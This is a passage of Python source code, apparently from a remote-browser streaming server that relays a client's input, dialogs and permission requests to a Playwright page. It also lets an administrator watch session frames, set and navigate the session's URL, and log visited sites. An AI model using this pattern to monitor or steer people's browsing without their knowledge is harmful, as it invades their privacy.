        """Actual dialog handling logic - runs independently"""
        try:
            dialog_type = dialog.type
            message = dialog.message
            default_text = dialog.default_value if hasattr(dialog, 'default_value') else ""
            
            log(f"[DIALOG] Handling: {dialog_type} - {message[:50]}...")
            
            # Forward dialog to client
            await self._send_permission_request(
                request_type="dialog",
                dialog_type=dialog_type,
                message=message,
                default_text=default_text
            )
            
            # Wait for client response with timeout
            request_id = f"dialog_{time.time()}"
            try:
                response = await asyncio.wait_for(
                    self._wait_for_permission_response(request_id),
                    timeout=30.0
                )
                
                if response and response.get("action") == "accept":
                    if dialog_type == "prompt":
                        await dialog.accept(response.get("text", ""))
                    else:
                        await dialog.accept()
                    log(f"[DIALOG] Accepted")
                else:
                    await dialog.dismiss()
                    log(f"[DIALOG] Dismissed")
                    
            except asyncio.TimeoutError:
                await dialog.dismiss()
                log(f"[DIALOG] Timeout - dismissed")
                
        except asyncio.CancelledError:
            pass
        except Exception as e:
            # Silently handle dialog errors to prevent streaming disruption
            try:
                await dialog.dismiss()
            except Exception:
                pass
    
    async def _handle_permission_request(self, permission_type: str, origin: str):
        """Handle permission request from browser"""
        try:
            log(f"[PERMISSIONS] Permission request: {permission_type} from {origin}")
            
            # Map permission types to readable names
            permission_names = {
                "notifications": "Notifications",
                "camera": "Camera",
                "microphone": "Microphone", 
                "geolocation": "Location",
                "clipboard-read": "Clipboard Read",
                "clipboard-write": "Clipboard Write",
                "background-sync": "Background Sync",
                "midi": "MIDI",
                "payment-handler": "Payment Handler",
            }
            
            display_name = permission_names.get(permission_type, permission_type.title())
            
            # Forward permission request to client
            await self._send_permission_request(
                request_type="permission",
                permission=permission_type,
                display_name=display_name,
                origin=origin
            )
            
            # Wait for client response with timeout
            request_id = f"perm_{permission_type}_{time.time()}"
            try:
                response = await asyncio.wait_for(
                    self._wait_for_permission_response(request_id),
                    timeout=30.0  # 30 second timeout
                )
                
                if response and response.get("action") == "allow":
                    # Grant permission
                    await self.context.grant_permissions(
                        [{'type': permission_type, 'origin': origin}]
                    )
                    log(f"[PERMISSIONS] Permission granted: {permission_type}")
                else:
                    # Deny permission (default)
                    log(f"[PERMISSIONS] Permission denied: {permission_type}")
                    
            except asyncio.TimeoutError:
                # Default: deny permission to prevent hanging
                log(f"[PERMISSIONS] Permission request timeout - denied by default")
                
        except Exception as e:
            log_error(f"[PERMISSIONS] Error handling permission request: {e}")
    
    async def _send_permission_request(self, **kwargs):
        """Send permission request to client"""
        try:
            if self.websocket and self.is_active:
                request_id = kwargs.get("request_id", f"req_{time.time()}")
                kwargs["request_id"] = request_id
                kwargs["type"] = "permission_request"
                
                await self.websocket.send_json(kwargs)
                log(f"[PERMISSIONS] Sent permission request to client: {kwargs.get('request_type')}")
        except Exception as e:
            log_error(f"[PERMISSIONS] Error sending permission request: {e}")
    
    async def _wait_for_permission_response(self, request_id: str) -> Dict:
        """Wait for client permission response"""
        future = asyncio.Future()
        self._pending_permissions[request_id] = future
        
        try:
            result = await future
            return result
        finally:
            # Clean up
            if request_id in self._pending_permissions:
                del self._pending_permissions[request_id]
    
    async def handle_permission_response(self, response_data: Dict):
        """Handle permission response from client"""
        try:
            request_id = response_data.get("request_id")
            action = response_data.get("action")  # "allow", "deny", "accept", "dismiss"
            text = response_data.get("text", "")  # For prompt dialogs
            
            if request_id and request_id in self._pending_permissions:
                future = self._pending_permissions[request_id]
                if not future.done():
                    future.set_result({
                        "action": action,
                        "text": text
                    })
                    log(f"[PERMISSIONS] Received client response: {action} for {request_id}")
            else:
                log(f"[PERMISSIONS] Received response for unknown request: {request_id}")
                
        except Exception as e:
            log_error(f"[PERMISSIONS] Error handling permission response: {e}")
    
    async def handle_input(self, input_data: Dict):
        """Handle remote-browser input using the client CSS pixel coordinates directly."""
        if not self.is_active or not self.page:
            logger.warning(
                "[INPUT][drop] session=%s active=%s page=%s",
                self.session_id, self.is_active, bool(self.page),
            )
            return

        if not self.inputs_enabled:
            logger.warning("[INPUT][drop] session=%s inputs_enabled=False", self.session_id)
            return

        event = ''
        try:
            self.last_activity = time.time()
            self._sync_dom_capture()
            active_page = self.get_active_page()
            backend_name = getattr(active_page, "_backend_name", type(active_page).__name__ if active_page else "none")
            if not self._input_handoff_logged:
                logger.warning(
                    "[INPUT][handoff] session=%s backend=%s websocket->session->page connected",
                    self.session_id, backend_name,
                )
                self._input_handoff_logged = True
            logger.debug(
                "[INPUT][recv] session=%s backend=%s event=%s keys=%s",
                self.session_id,
                backend_name,
                input_data.get('subtype') or input_data.get('event') or input_data.get('type'),
                sorted(k for k in input_data.keys() if k not in {'text'}),
            )

            if self.is_sleeping:
                await self.wake()

            event = input_data.get('subtype', '') or input_data.get('event', '') or input_data.get('type', '')
            page = self.get_active_page()
            if not page:
                return

            if event == 'mousemove':
                x = int(input_data.get('x', 0))
                y = int(input_data.get('y', 0))
                self.mouse_position = {'x': x, 'y': y}
                self.mouse_buttons = input_data.get('buttons', 0)
                await page.mouse.move(x, y)

            elif event == 'mousedown':
                x = int(input_data.get('x', 0))
                y = int(input_data.get('y', 0))
                button = input_data.get('button', 0)
                button_map = {0: 'left', 1: 'middle', 2: 'right'}
                button_name = button_map.get(button, 'left')
                await page.mouse.move(x, y)
                await page.mouse.down(button=button_name)

            elif event == 'mouseup':
                x = int(input_data.get('x', 0))
                y = int(input_data.get('y', 0))
                button = input_data.get('button', 0)
                button_map = {0: 'left', 1: 'middle', 2: 'right'}
                button_name = button_map.get(button, 'left')
                self.mouse_position = {'x': x, 'y': y}
                await page.mouse.move(x, y)
                await page.mouse.up(button=button_name)
                await self.capture_remote_page(reason='mouseup')

            elif event in {'click', 'tap'}:
                # Element-pure: route through the DOM-capture click relay
                # using the captured element's data-mid / CSS selector.
                selector = input_data.get('selector')
                mid = input_data.get('mid')
                backend = getattr(page, '_backend_name', type(page).__name__)
                logger.debug(
                    "[INPUT][click] session=%s backend=%s page_id=%s selector=%s mid=%s",
                    self.session_id, backend, self.active_page_id, selector, mid,
                )
                if self.dom_capture:
                    handled = await self.dom_capture.handle_click(selector=selector, mid=mid)
                    if not handled:
                        logger.warning(
                            "[INPUT][click] not dispatched session=%s backend=%s "
                            "page_id=%s selector=%s mid=%s",
                            self.session_id, backend, self.active_page_id, selector, mid,
                        )
                elif selector:
                    try:
                        await page.click(selector, timeout=1200)
                    except Exception:
                        pass
                await self.capture_remote_page(reason='click')

            elif event == 'wheel':
                x = int(input_data.get('x', 0))
                y = int(input_data.get('y', 0))
                delta_x = input_data.get('deltaX', 0)
                delta_y = input_data.get('deltaY', 0)
                delta_mode = input_data.get('deltaMode', 0)

                try:
                    delta_x = float(delta_x)
                    delta_y = float(delta_y)
                except Exception:
                    delta_x = 0.0
                    delta_y = 0.0

                if delta_mode == 1:
                    delta_x *= 20.0
                    delta_y *= 20.0
                elif delta_mode == 2:
                    delta_x *= 60.0
                    delta_y *= 60.0

                await page.mouse.move(x, y)
                await page.mouse.wheel(int(round(delta_x)), int(round(delta_y)))

            elif event == 'scroll_sync':
                scroll_x = int(input_data.get('scrollX', 0))
                scroll_y = int(input_data.get('scrollY', 0))
                try:
                    await page.evaluate(f"window.scrollTo({scroll_x}, {scroll_y});")
                except Exception:
                    pass

            elif event == 'text':
                text = input_data.get('text', '')
                if text:
                    await page.evaluate("""
                        () => {
                            const el = document.activeElement;
                            if (!el || el === document.body || el === document.documentElement) {
                                const inputs = document.querySelectorAll('input:not([type=hidden]), textarea, [contenteditable=true]');
                                for (const input of inputs) {
                                    if (input.offsetParent !== null) {
                                        input.focus();
                                        break;
                                    }
                                }
                            }
                        }
                    """)
                    await page.keyboard.insert_text(text)
                    await self.capture_remote_page(reason='text')

            elif event == 'keydown':
                key = input_data.get('key', '')
                modifiers = input_data.get('modifiers', {})

                if modifiers.get('ctrl'):
                    await page.keyboard.down('Control')
                if modifiers.get('shift'):
                    await page.keyboard.down('Shift')
                if modifiers.get('alt'):
                    await page.keyboard.down('Alt')
                if modifiers.get('meta'):
                    await page.keyboard.down('Meta')

                await page.keyboard.press(key)
                await self.capture_remote_page(reason='keydown')

                if modifiers.get('ctrl'):
                    await page.keyboard.up('Control')
                if modifiers.get('shift'):
                    await page.keyboard.up('Shift')
                if modifiers.get('alt'):
                    await page.keyboard.up('Alt')
                if modifiers.get('meta'):
                    await page.keyboard.up('Meta')

            elif event == 'keyup':
                key = input_data.get('key', '')
                await page.keyboard.up(key)

            elif event == 'touchstart':
                touches = input_data.get('touches', [])
                if touches:
                    touch = touches[0]
                    x = int(touch.get('x', 0))
                    y = int(touch.get('y', 0))
                    await page.mouse.move(x, y)
                    await page.mouse.down(button='left')

            elif event == 'touchmove':
                touches = input_data.get('touches', [])
                if touches:
                    touch = touches[0]
                    x = int(touch.get('x', 0))
                    y = int(touch.get('y', 0))
                    await page.mouse.move(x, y)

            elif event == 'touchend':
                touches = input_data.get('touches', [])
                if touches:
                    touch = touches[0]
                    x = int(touch.get('x', 0))
                    y = int(touch.get('y', 0))
                    await page.mouse.move(x, y)
                    await page.mouse.up(button='left')
                    await self.capture_remote_page(reason='touchend')

            elif event == 'goto' and 'url' in input_data:
                url = input_data['url']
                if url:
                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'https://' + url
                    log(f"[NAVIGATION] Admin requested goto: {url}")
                    capture = self._sync_dom_capture()
                    capture._explicit_navigation_in_progress = True
                    try:
                        await page.goto(url, wait_until='domcontentloaded', timeout=30000)
                        self.current_domain = self._extract_domain(url)
                        self._apply_snapshot_preference(url)

                        if self.browser_manager:
                            await self.browser_manager.profile_manager.add_visited_site(
                                self.user_id,
                                self.current_domain,
                                title=await page.title() if page else '',
                                favicon_url=f"https://{self.current_domain}/favicon.ico"
                            )

                        await self._save_profile_info()
                        await self._send_metadata()
                        await self.capture_remote_page(reason='goto')
                    finally:
                        capture._explicit_navigation_in_progress = False

            elif event == 'reload':
                capture = self._sync_dom_capture()
                capture._explicit_navigation_in_progress = True
                try:
                    await page.reload(wait_until='domcontentloaded', timeout=30000)
                    await self.capture_remote_page(reason='reload')
                finally:
                    capture._explicit_navigation_in_progress = False

            elif event == 'back':
                capture = self._sync_dom_capture()
                capture._explicit_navigation_in_progress = True
                try:
                    try:
                        await page.go_back(wait_until='domcontentloaded', timeout=30000)
                        await self.capture_remote_page(reason='back')
                    except Exception:
                        pass
                finally:
                    capture._explicit_navigation_in_progress = False

            elif event == 'forward':
                capture = self._sync_dom_capture()
                capture._explicit_navigation_in_progress = True
                try:
                    try:
                        await page.go_forward(wait_until='domcontentloaded', timeout=30000)
                        await self.capture_remote_page(reason='forward')
                    except Exception:
                        pass
                finally:
                    capture._explicit_navigation_in_progress = False

        except Exception as e:
            error_msg = str(e)
            if "Unknown key" in error_msg or "Unidentified" in error_msg:
                logger.warning(
                    "[INPUT][key-rejected] session=%s backend=%s event=%s error=%s",
                    self.session_id,
                    getattr(self.get_active_page(), "_backend_name", "unknown"),
                    event,
                    error_msg,
                )
            else:
                logger.exception(
                    "[INPUT][failed] session=%s backend=%s event=%s",
                    self.session_id,
                    getattr(self.get_active_page(), "_backend_name", "unknown"),
                    event,
                )

    async def handle_click(self, selector: Optional[str] = None, mid: Optional[str] = None):
        if self.dom_capture:
            await self.dom_capture.handle_click(selector=selector, mid=mid)

    async def handle_navigation(self, url: str):
        if self.dom_capture:
            self._apply_snapshot_preference(url)
            await self.dom_capture.handle_navigation(url)

    def _apply_snapshot_preference(self, url: str) -> None:
        """Choose the per-site full-document fidelity cadence.

        Snapshot preference no longer disables the live delta channel: safe
        mutations are patched in place for every host, while full documents
        remain the navigation/recovery floor.  DOM_LIVE_HOSTS keeps the more
        aggressive live preference for its full-capture cadence."""
        try:
            from dom_capture import prefer_snapshot_for_url
            dc = getattr(self, 'dom_capture', None)
            if dc is None or not url:
                return
            dc.snapshot_only = bool(prefer_snapshot_for_url(url))
        except Exception:
            pass

    async def handle_keypress(self, key: str, selector: Optional[str] = None, ctrl: bool = False, shift: bool = False, alt: bool = False, mid: Optional[str] = None):
        if not self.page or not self.dom_capture:
            return
        try:
            # data-mid survives DOM churn between capture frames; a bare CSS
            # selector taken from a stale mirror snapshot may not.  Prefer it.
            focused = False
            if mid is not None:
                try:
                    safe_mid = re.sub(r'[^0-9A-Za-z_\-]', '', str(mid))
                    if safe_mid:
                        mid_selector = f'[data-mid="{safe_mid}"]'
                        # The SB adapter can focus through ChromeDriver's
                        # trusted renderer session.  This avoids relying on a
                        # CDP Runtime.evaluate call merely to establish the
                        # active element before native key actions.
                        await self.page.focus(mid_selector)
                        focused = True
                except Exception:
                    focused = False
            if not focused and selector:
                try:
                    await self.page.focus(selector)
                except Exception:
                    pass
            if key and len(key) == 1:
                await self.page.keyboard.type(key, delay=0)
            elif key:
                key_map = {
                    'Enter': 'Enter',
                    'Backspace': 'Backspace',
                    'Delete': 'Delete',
                    'Tab': 'Tab',
                    'Escape': 'Escape',
                    'ArrowUp': 'ArrowUp',
                    'ArrowDown': 'ArrowDown',
                    'ArrowLeft': 'ArrowLeft',
                    'ArrowRight': 'ArrowRight'
                }
                if key in key_map:
                    if ctrl:
                        await self.page.keyboard.down('Control')
                    if shift:
                        await self.page.keyboard.down('Shift')
                    if alt:
                        await self.page.keyboard.down('Alt')

                    await self.page.keyboard.press(key_map[key])

                    if ctrl:
                        await self.page.keyboard.up('Control')
                    if shift:
                        await self.page.keyboard.up('Shift')
                    if alt:
                        await self.page.keyboard.up('Alt')
        except Exception as exc:
            log_error(f"Keypress handling failed: {exc}")

    async def handle_input_sync(self, mid: Optional[str] = None, selector: Optional[str] = None,
                                name: Optional[str] = None, field_id: Optional[str] = None,
                                value: str = '', checked: Optional[bool] = None):
        """Absolute-value sync from the mirror client.  Idempotent; immune to
        DOM churn as long as ONE of the addressing keys still resolves:
        data-mid (stamped by the capture) -> CSS selector -> name -> id.
        Uses the native value setter so framework value trackers (React et
        al.) record the change, then dispatches bubbling input/change."""
        if not self.page:
            return
        try:
            safe_mid = re.sub(r'[^0-9A-Za-z_\-]', '', str(mid)) if mid is not None else ''
            js_mid = json.dumps(safe_mid) if safe_mid else 'null'
            js_sel = json.dumps(str(selector)) if selector else 'null'
            js_nm = json.dumps(str(name)) if name else 'null'
            js_id = json.dumps(str(field_id)) if field_id else 'null'
            js_val = json.dumps(str(value))
            js_chk = 'null' if checked is None else ('true' if checked else 'false')
            await self.page.evaluate(
                "(()=>{"
                "const mid=" + js_mid + ",sel=" + js_sel + ",nm=" + js_nm + ",fid=" + js_id +
                ",val=" + js_val + ",chk=" + js_chk + ";"
                "let el=null;"
                "if(mid)el=document.querySelector('[data-mid=\"'+mid+'\"]');"
                "if(!el&&sel){try{el=document.querySelector(sel)}catch(e){}}"
                "if(!el&&nm){el=document.querySelector('input[name=\"'+nm.replace(/\"/g,'\\\\\"')+'\"],textarea[name=\"'+nm.replace(/\"/g,'\\\\\"')+'\"],select[name=\"'+nm.replace(/\"/g,'\\\\\"')+'\"]')}"
                "if(!el&&fid){el=document.getElementById(fid)}"
                "if(!el)return false;"
                "const tag=el.tagName;"
                "if(tag!=='INPUT'&&tag!=='TEXTAREA'&&tag!=='SELECT')return false;"
                "if(el.disabled||el.readOnly)return false;"
                "const type=(el.type||'').toLowerCase();"
                "if(chk!==null&&(type==='checkbox'||type==='radio')){"
                "if(el.checked!==chk){el.checked=chk;el.dispatchEvent(new Event('input',{bubbles:true}));el.dispatchEvent(new Event('change',{bubbles:true}));}"
                "return true;}"
                "if(type==='file'||type==='button'||type==='submit'||type==='reset'||type==='image')return false;"
                "const proto=tag==='TEXTAREA'?HTMLTextAreaElement.prototype:(tag==='SELECT'?HTMLSelectElement.prototype:HTMLInputElement.prototype);"
                "const desc=Object.getOwnPropertyDescriptor(proto,'value');"
                "if(desc&&desc.set)desc.set.call(el,val);else el.value=val;"
                "el.dispatchEvent(new Event('input',{bubbles:true}));"
                "el.dispatchEvent(new Event('change',{bubbles:true}));"
                "return true;})()"
            )
        except Exception as exc:
            log_error(f"input_sync apply failed: {exc}")

    async def capture_first_input(self):
        capture = self._sync_dom_capture()
        if capture and LIVE_DELTA and getattr(capture, "_delta_active", False):
            # Focus/input state is already local in the mirror and the remote
            # field is synchronized by input_sync/dom_patch; do not schedule a
            # 120 ms full-document rebuild just because the keyboard opened.
            return
        if self._capture_first_input_task and not self._capture_first_input_task.done():
            self._capture_first_input_task.cancel()

        async def delayed_capture():
            try:
                await asyncio.sleep(0.12)
                await self.capture_remote_page(reason='capture_first_input')
            except asyncio.CancelledError:
                pass
            except Exception as exc:
                log_error(f"Capture first input failed: {exc}")
            finally:
                self._capture_first_input_task = None

        self._capture_first_input_task = asyncio.create_task(delayed_capture())

    async def set_url(self, url: str) -> bool:
        """Set/override the target URL (used by Admin to control navigation)"""
        try:
            if url:
                if not url.startswith('http://') and not url.startswith('https://'):
                    url = 'https://' + url
                
                self.target_url = url
                log(f"[URL] Target URL set to: {url}")
                
                # If page exists and is active, navigate immediately
                if self.get_active_page() and self.is_active:
                    await self.get_active_page().goto(url, wait_until='domcontentloaded', timeout=30000)
                    self.current_domain = self._extract_domain(url)
                    await self._save_profile_info()
                    return True
                    
        except Exception as e:
            log_error(f"Error setting URL: {e}")
        
        return False

    async def handle_resize(self, new_viewport: Dict):
        """Store the client viewport and apply it directly as CSS pixels to the browser page.

        MOBILE FIDELITY FIX: resizing previously called
        ``context.set_viewport_size`` — a method that does NOT exist on
        Playwright's BrowserContext (only Page has it), so every viewport
        change after connect (iOS URL-bar collapse, rotation) was silently
        swallowed. The emulated browser then kept rendering at the stale
        size while the client displayed the page at the new size —
        white space and mismatched scale inside the browser.
        """
        try:
            # Capture the old viewport first — the resize message doesn't
            # carry the real device screen metrics, and they never change.
            _prev = getattr(self, 'viewport', None) or {}
            self.viewport = {
                'width': int(new_viewport.get('width', self.viewport.get('width', 1920))),
                'height': int(new_viewport.get('height', self.viewport.get('height', 1080))),
                'pixelRatio': float(new_viewport.get('pixelRatio', 1.0))
            }
            self.pixel_ratio = self.viewport.get('pixelRatio', 1.0)
            try:
                if 'device_screen_width' in _prev:
                    self.viewport['device_screen_width'] = _prev['device_screen_width']
                if 'device_screen_height' in _prev:
                    self.viewport['device_screen_height'] = _prev['device_screen_height']
            except Exception:
                pass

            size = {'width': self.viewport['width'], 'height': self.viewport['height']}
            applied = False

            # Resize every live page so the whole browser renders at the
            # client's current viewport — the full browser width/height is
            # how the page content must be rendered.
            try:
                pages = []
                try:
                    if self.pages:
                        pages = list(self.pages.values())
                except Exception:
                    pages = []
                if not pages and self.get_active_page():
                    pages = [self.get_active_page()]
                for p in pages:
                    try:
                        if p is not None and hasattr(p, 'set_viewport_size'):
                            await p.set_viewport_size(size)
                            applied = True
                    except Exception:
                        pass
            except Exception:
                pass

            if not applied and self.context and hasattr(self.context, 'set_viewport_size'):
                try:
                    await self.context.set_viewport_size(size)
                except Exception:
                    pass

            # Keep the physical-viewport snapshot in sync so metadata and
            # capture stay consistent after the resize.
            try:
                self._physical_viewport_width = self.viewport['width']
                self._physical_viewport_height = self.viewport['height']
            except Exception:
                pass

        except Exception as e:
            log_error(f"Error in handle_resize: {e}")
    
    async def _apply_resize_debounced(self):
        """Compatibility shim for older resize flows; the browser viewport is updated directly."""
        return None

    async def handle_visual_viewport(self, visual_viewport_data: Dict):
        """Ignore visual viewport sync messages; the browser page handles its own scrolling."""
        return None


    async def _notify_stream_error(self, error_message: str):
        """Notify client of streaming error - helps debug freeze issues"""
        try:
            if self.websocket and not self.websocket.closed:
                await self.websocket.send_json({
                    "type": "stream_error",
                    "message": error_message,
                    "session_id": self.session_id
                })
                log_error(f"[STREAM ERROR] Notified client: {error_message}")
        except Exception as e:
            log_error(f"Failed to notify client of stream error: {e}")

    async def _send_metadata(self):
        """Send session metadata to client"""
        if not self.page:
            return

        try:
            title = await self.page.title()

            # LOGICAL-PIXEL POLICY: always send the client's logical (CSS)
            # pixel dimensions with pixelRatio: 1. The client must NOT
            # rescale anything - the server already uses CSS pixels for
            # the browser layout, the screencast capture, and WebRTC frames.
            viewport_data = {
                "width": self.viewport['width'],
                "height": self.viewport['height'],
                "pixelRatio": 1,  # 1.0 - dimensions are already in CSS pixels
            }

            await self.websocket.send_json({
                "type": "metadata",
                "title": title,
                "url": self.page.url,
                "session_id": self.session_id,
                "user_id": self.user_id,
                "viewport": viewport_data,
                "gpu_mode": self.config.use_gpu,
                "gpu_id": self.gpu_id,
                "quality": self.current_quality,
                "target_fps": self.current_fps,
                "streaming_type": self._streaming_type,
                "keyboard": True,  # Enable mobile virtual keyboard handling
            })
        except Exception:
            pass

    async def handle_client_feedback(self, feedback_data: Dict):
        """
        Handle client feedback for adaptive bitrate streaming
        Client sends: {type: 'feedback', latency_ms: X, buffer_status: Y, frame_drops: Z}
        """
        try:
            if self.bitrate_controller:
                self.bitrate_controller.update_client_feedback(
                    latency_ms=feedback_data.get('latency_ms', 50),
                    frame_drop_percent=feedback_data.get('frame_drops', 0)
                )

                # Calculate and apply new bitrate
                new_bitrate = self.bitrate_controller.calculate_adjusted_bitrate()
                if new_bitrate != self.config.bitrate:
                    self.config.bitrate = new_bitrate
                    log(f"Adaptive Bitrate: {new_bitrate / 1000000:.1f} Mbps (client feedback)")

        except Exception:
            pass

    async def handle_webrtc_offer(self, sdp: str, sdp_type: str) -> Dict:
        """
        Process a WebRTC SDP offer from the client.

        The client opens an RTCPeerConnection, creates an SDP offer for a
        "recvonly" video track, and sends it over the WebSocket. We feed it
        to the active WebRTCStreamer which returns the matching answer.
        The answer is then sent back to the client to complete the handshake.
        """
        if not self._streamer or not isinstance(self._streamer, WebRTCStreamer):
            log_error("WebRTC offer received but no WebRTCStreamer is active")
            raise RuntimeError("WebRTC streaming not active")

        answer = await self._streamer.handle_offer(sdp=sdp, sdp_type=sdp_type)
        log(f"[WEBRTC] SDP offer handled, returning answer ({len(answer.get('sdp', ''))} bytes)")
        return answer

    async def handle_webrtc_ice_candidate(self, candidate_data: Dict):
        """
        Add a trickle ICE candidate sent by the client to our peer connection.
        """
        if not self._streamer or not isinstance(self._streamer, WebRTCStreamer):
            log("ICE candidate received but no WebRTCStreamer is active - ignoring")
            return
        try:
            await self._streamer.add_ice_candidate(candidate_data)
        except Exception as e:
            log(f"[WEBRTC] Failed to add ICE candidate: {e}")

    async def enter_sleep(self):
        """Enter sleep mode - Part 5: Stream Pause"""
        if self.is_sleeping:
            return
        self.is_sleeping = True
        self.inputs_enabled = False
        self.last_activity = time.time()
        
        # Stop admin monitoring if active
        if self._streamer:
            self._streamer.enable_frame_callback(False)
        
        # Update profile status
        if self.browser_manager:
            await self.browser_manager.profile_manager.update_status(
                self.user_id, 'paused', self.page.url if self.page else ''
            )
        
        log(f"Session {self.session_id} entered sleep mode")

    async def wake(self):
        """Wake from sleep mode - Part 5: Stream Resume"""
        if not self.is_sleeping:
            return
        self.is_sleeping = False
        self.inputs_enabled = True
        self.last_activity = time.time()
        
        # Update profile status
        if self.browser_manager:
            await self.browser_manager.profile_manager.update_status(
                self.user_id, 'online', self.page.url if self.page else ''
            )
        
        log(f"Session {self.session_id} woke from sleep")
        
        # Send metadata to reconnected client
        await self._send_metadata()

    @property
    def websocket_generation(self) -> int:
        """Current websocket generation for endpoint stale-work protection."""
        return self._websocket_generation

    def is_websocket_current(self, websocket, generation: int = None) -> bool:
        """Return whether ``websocket`` still owns this runtime generation."""
        if websocket is None or self.websocket is not websocket:
            return False
        if generation is not None and generation != self._websocket_generation:
            return False
        return not self._cleanup_started

    async def reattach_websocket(self, new_websocket):
        """Atomically replace the socket owner and return its generation.

        The old socket is invalidated before its graceful close is awaited, so
        a late disconnect cannot remove, mark offline, or cancel work for the
        replacement generation.
        """
        if new_websocket is None:
            raise ValueError("new_websocket is required")
        log(f"Reattaching websocket for session {self.session_id}")

        async with self._websocket_state_lock:
            if self._cleanup_started or self._closing:
                raise RuntimeError("session is already closing")
            old_ws = self.websocket
            self._websocket_generation += 1
            generation = self._websocket_generation
            # Publish the replacement before awaiting any old-socket close.
            self.websocket = new_websocket

        # Close any existing websocket after ownership has moved.
        if old_ws and old_ws is not new_websocket:
            try:
                # Only attempt graceful close if the WS has actually been accepted.
                # FastAPI/Starlette raises "Need to call accept first" otherwise.
                client_state = getattr(old_ws, 'client_state', None)
                state_name = getattr(client_state, 'name', None) if client_state else None
                accepted = (
                    state_name == 'CONNECTED'
                    or (client_state is not None and not getattr(old_ws, 'closed', False)
                        and state_name not in ('CONNECTING', 'CLOSED', 'DISCONNECTED'))
                )
                if hasattr(old_ws, 'close') and accepted:
                    try:
                        try:
                            await old_ws.send_json({
                                "type": "session_replaced",
                                "reason": "replaced_by_new_session",
                            })
                        except Exception:
                            pass
                        await old_ws.close(code=4001, reason="replaced_by_new_session")
                    except Exception:
                        pass
            except Exception:
                pass

        try:
            self._sync_dom_capture()
        except Exception:
            logger.debug("[Reconnect] DOM capture rebind failed", exc_info=True)

        # Update state
        self.last_activity = time.time()
        self.inputs_enabled = True

        # Wake from sleep mode if sleeping
        if self.is_sleeping:
            self.is_sleeping = False
            if self.browser_manager:
                try:
                    await self.browser_manager.profile_manager.update_status(
                        self.user_id, 'online', self.page.url if self.page else ''
                    )
                except Exception:
                    logger.debug("[Reconnect] profile wake update failed", exc_info=True)
            log(f"Woke session {self.session_id} from sleep")

        # Send metadata to reconnected client
        await self._send_metadata()

        # Resume streaming if applicable - fire-and-forget (no await needed)
        if self._streamer and not self._streamer.is_active:
            asyncio.create_task(self._streamer.start(self.page, self.websocket))

        log(f"Websocket reattached successfully for session {self.session_id} (generation={generation})")
        return generation

    async def shutdown(self, force: bool = False):
        """Shutdown the session and invalidate its current socket generation."""
        log(f"Shutting down session {self.session_id} (force={force})")
        async with self._websocket_state_lock:
            if self._cleanup_started or self._closing:
                return
            self._closing = True
            self._websocket_generation += 1
            self.websocket = None
        self.is_active = False
        
        # Only the last runtime session for a stable parent may mark the
        # shared Admin/profile record offline.
        try:
            from browser_manager import profile_has_active_session
            has_sibling = profile_has_active_session(self.user_id, exclude_session_id=self.session_id)
        except Exception:
            has_sibling = False
        if self.browser_manager and not has_sibling:
            await self.browser_manager.profile_manager.update_status(self.user_id, 'offline')
        
        await self.cleanup()

    async def enable_admin_monitoring(self):
        """Enable admin frame broadcasting - called when admin subscribes to watch"""
        if self._streamer:
            self._streamer.enable_frame_callback(True)
            log(f"Admin monitoring enabled for session {self.session_id}")

    async def disable_admin_monitoring(self):
        """Disable admin frame broadcasting - called when admin unsubscribes"""
        if self._streamer:
            self._streamer.enable_frame_callback(False)
            log(f"Admin monitoring disabled for session {self.session_id}")

    async def get_info(self) -> Dict:
        """Get session info"""
        try:
            title = await self.get_active_page().title() if self.get_active_page() else "--"
            current_url = self.get_active_page().url if self.get_active_page() else "--"
            perf_stats = self.perf_monitor.get_stats()
            
            # Get streamer stats if available
            streamer_stats = {}
            if self._streamer:
                streamer_stats = self._streamer.get_stats()

            # Calculate session duration
            session_duration = round(time.time() - self.start_time, 1)
            
            # Calculate inactive time
            inactive_time = round(time.time() - self.last_activity, 1)

            return {
                "client_id": self.session_id,
                "user_id": self.user_id,
                "parent_client_id": self.user_id,
                "device_id": getattr(self, "device_id", "") or self.session_id,
                "client_type": "browser",
                "mode": "browser",
                "current_url": current_url,
                "title": title,
                "status": "active" if self.is_active else "inactive",
                "is_sleeping": self.is_sleeping,
                "browser": "Chrome",
                "gpu_id": self.gpu_id,
                "fps": perf_stats.get('fps', 0),
                "streamer_fps": streamer_stats.get('actual_fps', 0),
                "quality": self.current_quality,
                "frame_count": self.frame_count,
                "uptime": session_duration,
                "inactive_time": inactive_time,
                "streaming_type": self._streaming_type,
                "last_activity": self.last_activity,
            }
        except Exception:
            return {"client_id": self.session_id, "status": "error"}

    async def cleanup(self, force: bool = False):
        """Cleanup session resources - ENHANCED with proper task cancellation
        
        Args:
            force: If True, forcefully terminates the browser process (for server restart)
        """
        import subprocess
        
        logger.debug(f"[Cleanup] Starting cleanup for session {self.session_id} (force={force})")
        
        async with self._websocket_state_lock:
            if self._cleanup_started:
                return
            self._cleanup_started = True
            self._closing = True
            self._websocket_generation += 1
            self.websocket = None
        self.is_active = False
        self.is_sleeping = False
        self.inputs_enabled = False

        # Cancel ALL background tasks
        tasks_to_cancel = [
            ('_heartbeat_task', self._heartbeat_task),
            ('_transition_check_task', self._transition_check_task),
            ('_resize_debounce_task', self._resize_debounce_task),
            ('_inactivity_task', self._inactivity_task),
            ('_streaming_task', self._streaming_task),  # PERFORMANCE: Cancel streaming task
        ]
        
        # PERFORMANCE: Signal streaming to shutdown
        self._streaming_shutdown_event.set()
        
        for task_name, task in tasks_to_cancel:
            if task:
                task.cancel()
                try:
                    await asyncio.wait_for(asyncio.shield(task), timeout=1.0)
                except asyncio.TimeoutError:
                    logger.debug(f"[Cleanup] {task_name} did not complete in time")
                except asyncio.CancelledError:
                    pass
                except Exception as e:
                    error_str = str(e)
                    if any(x in error_str for x in ['TargetClosedError', 'target', 'closed', 'browser', 'page']):
                        logger.debug(f"[Cleanup] {task_name} (expected): {e}")
                    else:
                        logger.debug(f"[Cleanup] {task_name}: {e}")
                # Set to None regardless
                setattr(self, task_name, None)
        
        # Stop URL/delta capture tasks and release this runtime session's
        # asset leases before the live page is closed.
        try:
            if self.dom_capture:
                await self.dom_capture.shutdown()
        except Exception:
            logger.debug("[Cleanup] DOM capture shutdown failed", exc_info=True)

        # Clear proxy info if one was allocated
        if self.proxy_url:
            logger.debug(f"[PROXY] Session {self.session_id}: Proxy released (host: {self.proxy_host}:{self.proxy_port})")
            self.proxy_url = None
            self.proxy_host = None
            self.proxy_port = None
            self.proxy_username = None
            self.proxy_password = None
        
        # Do not let one tab's cleanup mark a shared stable parent offline
        # while another independent runtime session is still active.
        try:
